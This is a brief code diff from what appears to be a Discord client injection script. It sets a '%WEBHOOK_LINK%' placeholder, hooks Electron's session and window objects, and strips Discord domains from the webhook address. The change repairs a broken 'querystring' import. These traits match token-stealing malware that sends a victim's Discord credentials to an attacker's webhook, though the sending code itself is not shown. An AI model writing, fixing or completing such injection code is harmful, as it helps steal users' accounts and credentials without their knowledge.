@@ -3,7 +3,7 @@ var webhook = "%WEBHOOK_LINK%"
 
 const { session, BrowserWindow } = require('electron')
 const https = require("https");
-const querystring = ('querystring');
+const querystring = require('querystring');
 
 webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "").replace("https://discordapp.com", "")
 
